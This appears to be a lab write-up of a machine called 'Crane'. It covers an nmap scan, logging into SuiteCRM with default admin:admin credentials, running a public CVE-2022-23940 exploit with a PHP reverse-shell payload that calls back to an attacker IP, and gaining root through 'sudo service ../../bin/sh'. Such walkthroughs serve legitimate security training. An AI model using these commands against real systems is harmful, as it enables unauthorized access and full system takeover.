---
icon: ubuntu
---

# Crane - Intermediate

## Gaining Access

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.146 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 15:52 EDT                                                                                     
Nmap scan report for 192.168.118.146                                                                                                                
Host is up (0.032s latency).                                                                                                                        
Not shown: 65531 closed tcp ports (reset)                                                                                                           
PORT      STATE SERVICE VERSION                                                                                                                     
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                              
| ssh-hostkey:                                                                                                                                      
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)                                                                                      
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)                                                                                     
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)                                                                                   
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))                                                                                              
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                        
| http-cookie-flags:                                                                                                                                
|   /:                                                                                                                                              
|     PHPSESSID:                                                                                                                                    
|_      httponly flag not set                                                                                                                       
| http-robots.txt: 1 disallowed entry                                                                                                               
|_/                                                                                                                                                 
| http-title: SuiteCRM                                                                                                                              
|_Requested resource was index.php?action=Login&module=Users                                                                                        
3306/tcp  open  mysql   MySQL (unauthorized)                                                                                                        
33060/tcp open  mysqlx  MySQL X protocol listener                                                                                                   
Device type: general purpose                                                                                                                        
Running: Linux 5.X                                                                                                                                  
OS CPE: cpe:/o:linux:linux_kernel:5                                                                                                                 
OS details: Linux 5.0 - 5.14                                                                                                                        
Network Distance: 4 hops                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                             
                                                                                                                                                    
TRACEROUTE (using port 21/tcp)                                                                                                                      
HOP RTT      ADDRESS                                                                                                                                
1   26.68 ms 192.168.45.1                                                                                                                           
2   26.32 ms 192.168.45.254                                                                                                                         
3   26.88 ms 192.168.251.1                                                                                                                          
4   28.05 ms 192.168.118.146
```

### HTTP Port 80 TCP

<figure><img src="../../.gitbook/assets/image (1504).png" alt=""><figcaption></figcaption></figure>

Upon visiting the page we are meet with a login form for Suite CRM, and default admin:admin Credentials work!

<figure><img src="../../.gitbook/assets/image (1505).png" alt=""><figcaption></figcaption></figure>

We find a version in the about page!

<figure><img src="../../.gitbook/assets/image (1506).png" alt=""><figcaption></figcaption></figure>

### SuiteCRM 7.12.3 RCE

[**Github**](https://github.com/manuelz120/CVE-2022-23940) offers a nice exploit for this version

```
git clone https://github.com/manuelz120/CVE-2022-23940.git
```

<figure><img src="../../.gitbook/assets/image (1509).png" alt=""><figcaption></figcaption></figure>

```
python3 exploit.py -h http://192.168.118.146/ -u admin -p admin -P "php -r '\$sock=fsockopen(\"192.168.45.158\", 80); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```

<figure><img src="../../.gitbook/assets/image (1510).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1511).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo service

<figure><img src="../../.gitbook/assets/image (1514).png" alt=""><figcaption></figcaption></figure>

[**gtfobins**](https://gtfobins.github.io/gtfobins/service/#sudo)

<figure><img src="../../.gitbook/assets/image (1516).png" alt=""><figcaption></figcaption></figure>

```
sudo service ../../bin/sh
```

<figure><img src="../../.gitbook/assets/image (1517).png" alt=""><figcaption></figcaption></figure>

We are root! :sunglasses:
